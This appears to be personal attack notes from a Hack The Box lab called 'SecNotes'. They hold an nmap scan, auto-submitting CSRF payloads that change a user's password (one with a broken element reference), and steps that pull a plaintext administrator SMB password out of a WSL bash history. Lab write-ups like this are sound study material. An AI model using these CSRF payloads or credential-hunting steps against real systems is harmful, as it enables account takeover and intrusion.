
```powershell
kali@kali ~> nmap -sC -sV -p- -T4 10.10.10.97
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 12:47 EDT
Nmap scan report for 10.10.10.97
Host is up (0.20s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0  <-------------------------------------- whats this
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2024-06-13T16:52:42
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 376.37 seconds
```






## findings

leaked username

```
Due to GDPR, all users must delete any notes that contain Personally Identifable Information (PII)
Please contact tyler@secnotes.htb using the contact link below with any questions.
```




## Possibilities

HTML GET 
```
<img src="http://www.example.com/api/setusername?username=CSRFd">
```


HTML POST requiring user interaction
```
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
```


HTML no user interaction
```
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>

<script>
 document.getElementById("autosubmit").submit();
</script>
```


```
POST /change_pass.php HTTP/1.1
Host: 10.10.10.97
Content-Length: 53
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.10.97
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en
Referer: http://10.10.10.97/change_pass.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=g2pf792aa4mva8cp08hktuaedk
Connection: close

password=123456&confirm_password=123456&submit=submit
```




### Possible payload 

```
<html>
    <form enctype="application/x-www-form-urlencoded" method="POST" action="http://10.10.10.97/change_pass.php">
        <table>
            <tr>
                <td>Password</td>
                <td><input type="text" value="123456" name="password"></td>
            </tr>
            <tr>
                <td>Confirm Password</td>
                <td><input type="text" value="123456" name="confirm_password"></td>
            </tr>
            <tr>
                <td>Submit</td>
                <td><input type="text" value="submit" name="submit"></td>
            </tr>
        </table>
       <script>
	document.getElementById("autosubmit").submit();
	</script>
    </form>
</html>

```


```
<html>
    <body>
        <form action="http://10.10.10.97/change_pass.php" method="POST">
            <input type="hidden" name="password" value="123123" />
            <input type="hidden" name="confirm_password" value="123123" />
            <input type="hidden" name="submit" value="submit" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>

```



To check if its opening links or etc. then open up an nc port and send your IP


Look inside of the directory, the full path usually looks like this

```
C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\
```

usually its somewhere there if its not then look here in this folder and look for anything that starts with `CanonicalGroupLimited`

```
C:\Users\%USERNAME%\AppData\Local\Packages
```

Now because we are root in the WSL, we need to remember that all we need to do is basically just look for credentials. go password hunting, so i did in the `.bash_history`



```
C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root>type .bash_history
type .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history
less .bash_history
exit
C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root>

```



# References 

https://x.com/Warlockobama/status/1068565938629427201/photo/1
https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#example-with-windows-xp-sp1-upnphost

https://github.com/samratashok/nishang